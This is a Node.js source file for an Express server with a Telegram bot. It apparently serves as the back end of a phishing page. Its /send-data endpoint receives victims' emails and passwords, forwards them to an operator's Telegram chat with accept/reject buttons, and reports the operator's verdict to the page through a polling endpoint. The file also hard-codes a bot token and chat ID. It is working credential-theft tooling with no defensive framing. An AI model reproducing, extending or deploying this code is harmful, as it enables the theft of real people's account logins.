const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const cors = require('cors');

const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ'; // ОБЯЗАТЕЛЬНО НОВЫЙ ИЗ BOTFATHER
const adminChatId = '-1003894478662'; 

const bot = new TelegramBot(token, { polling: true });
const app = express();

app.use(cors()); // Это ВАЖНО для работы с GitHub
app.use(express.json());

let userStatuses = {}; 

app.post('/send-data', (req, res) => {
    const { type, email, pass, userId } = req.body;
    userStatuses[userId] = 'pending';

    const message = `⚠️ **Вход**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``;

    bot.sendMessage(adminChatId, message, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: '✅ Подтвердить', callback_data: `ok_${userId}` },
                { text: '❌ Неверно', callback_data: `err_${userId}` }
            ]]
        }
    });
    res.json({ status: 'ok' });
});

bot.on('callback_query', (query) => {
    const [action, userId] = query.data.split('_');
    userStatuses[userId] = (action === 'ok') ? 'success' : 'error';
    
    bot.answerCallbackQuery(query.id, { text: "Готово" });
    bot.editMessageText(query.message.text + (action === 'ok' ? "\n\n✅ ПРИНЯТО" : "\n\n❌ ОТКЛОНЕНО"), {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id
    });
});

app.get('/check/:userId', (req, res) => {
    res.json({ status: userStatuses[req.params.userId] || 'none' });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
